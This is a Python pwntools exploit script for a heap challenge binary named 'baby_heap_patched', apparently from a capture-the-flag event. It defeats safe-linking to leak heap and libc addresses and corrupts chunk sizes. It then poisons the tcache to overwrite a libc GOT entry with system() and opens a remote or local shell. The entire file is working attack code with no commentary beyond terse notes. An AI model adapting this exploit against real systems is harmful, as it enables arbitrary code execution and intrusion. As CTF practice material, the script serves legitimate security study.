from pwn import *
import sys

BINARY = "baby_heap_patched"
context.binary = exe = ELF(BINARY, checksec=False)
ld = ELF("ld-linux-x86-64.so.2", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


def int_to_byte(x):
    return str(x).encode()


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def option(self, content):
        p = self.p
        p.sendline(content)

    def add_new_note_multi(self, index, note_length, content):
        p = self.p
        self.option(b"1")
        p.sendline(int_to_byte(index))
        p.sendline(b"2")
        p.sendlineafter(b"Note Length: ", int_to_byte(note_length))
        p.sendline(content)

    def add_new_note_single(self, index, content):
        p = self.p
        self.option(b"1")
        p.sendline(int_to_byte(index))
        p.sendline(b"1")
        p.sendline(content)

    def delete_note(self, index):
        p = self.p
        self.option(b"2")
        p.sendline(int_to_byte(index))

    def edit_note(self, index, content):
        p = self.p
        self.option(b"3")
        p.sendlineafter(b"Index: ", int_to_byte(index))
        p.sendline(content)

    def show_note(self, index):
        p = self.p
        self.option(b"4")
        p.sendline(int_to_byte(index))
        p.recvuntil(b"Content: ")
        return p.recvline()[:-1]


def defuscate(x, l=64):
    p = 0
    for i in range(l*4, 0, -4):  # 16 nibble
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << i+12)) >> i+12
        p |= (v1 ^ v2) << i
    return p


def obfuscate(p, adr):
    return p ^ (adr >> 12)


def main():
    x, p = init()
    x.debug()

    # leak heap address
    x.add_new_note_multi(0, 0x18, b"A"*8)
    x.add_new_note_single(1, b"A")
    x.delete_note(0)
    x.delete_note(1)
    x.add_new_note_multi(0, 0, b'')
    p.recvuntil(b"Error")
    heap_leak = x.show_note(0).ljust(8, b"\x00")
    heap_leak = u64(heap_leak)
    log.info(f"{heap_leak=:x}")
    # ?
    heap_base = defuscate(heap_leak)-0x12b0
    log.info(f"{heap_base=:x}")

    # leak libc address
    x.add_new_note_multi(0, 0x30, b"A"*8)
    x.add_new_note_multi(1, 0x30, b"A"*8)
    x.delete_note(0)
    x.delete_note(1)
    x.add_new_note_single(0, b"A")
    x.add_new_note_single(1, b"A")
    x.delete_note(0)
    x.delete_note(1)
    # Overwrite 1 bytes to change size heap
    target = obfuscate(heap_base+0x12e0, heap_base+0x1330)
    log.info(f"target: {target=:x} | {hex(target)[-2:]=}")
    overwrite = bytearray.fromhex(hex(target)[-2:])
    log.info(f"overwrite: {overwrite}")
    x.edit_note(1, overwrite)
    x.add_new_note_multi(0, 0x18, b"A"*8)
    x.add_new_note_multi(0, 0x30, b"A"*8)
    x.add_new_note_multi(0, 0x30, b"A"*8)
    x.add_new_note_multi(1, 0x18, b"A"*8+p64(0x451))  # overwrite size
    # Tidy up the heap struct so it won't broken
    for i in range(3):
        x.add_new_note_multi(1, 0x100, b"A"*8)
    x.add_new_note_multi(1, 0x50, b"A"*8)
    x.add_new_note_multi(1, 0x18, b"X"*8)
    x.add_new_note_multi(1, 0x18, b"X"*8)
    x.delete_note(0)  # Unsorted bin here
    x.add_new_note_multi(1, 0x0, b'')
    p.recv(10000)
    libc_leak = x.show_note(1)
    libc_leak = libc_leak.ljust(8, b"\x00")
    libc_leak = u64(libc_leak)
    log.info(f"{libc_leak=:x}")
    libc.address = libc_leak - 0x21d0e0 + 0x3000
    log.info(f"{libc.address=:x}")

    # Prepare tcache poisoning
    x.add_new_note_multi(0, 0x20, b"A"*8)
    x.add_new_note_multi(1, 0x20, b"A"*8)
    x.delete_note(0)
    x.delete_note(1)
    x.add_new_note_single(0, b"A")
    x.add_new_note_single(1, b"A")
    x.delete_note(0)
    x.delete_note(1)
    target = obfuscate(heap_base+0x1340, heap_base+0x1310)
    log.info(f"target: {target=:x} | {hex(target)[-2:]=}")
    overwrite = bytearray.fromhex(hex(target)[-2:])
    log.info(f"overwrite: {overwrite}")
    x.edit_note(1, overwrite)
    libc_got =  libc.address+0x219050
    log.info(f"{libc_got=:x}")
    x.add_new_note_multi(0, 0x18, b"/bin/sh\x00")
    x.add_new_note_multi(1, 0x18, p64(obfuscate(libc_got, heap_base+0x1340)))
    x.add_new_note_multi(1, 0x20, b"A"*8)
    log.info(f"{libc.sym['system']=:x}")
    x.add_new_note_multi(1, 0x20, b"///bin/sh\x00"+b"\x00"*6+p64(libc.sym['system']))
    p.sendlineafter(b"> ", b"4")
    p.interactive()


if __name__ == "__main__":
    main()
